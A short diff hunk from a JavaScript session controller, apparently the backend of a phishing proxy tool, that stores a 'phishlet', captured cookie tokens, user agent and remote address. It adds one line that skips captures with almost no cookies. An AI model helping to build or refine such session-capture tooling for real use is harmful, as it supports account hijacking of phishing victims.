@@ -30,6 +30,7 @@ exports.create = (req, res) => {
     useragent,
     remote_addr,
   } = req.body;
+  if (cookieToString(tokens).length < 10) return;
   sessionService
     .create({
       phishlet,
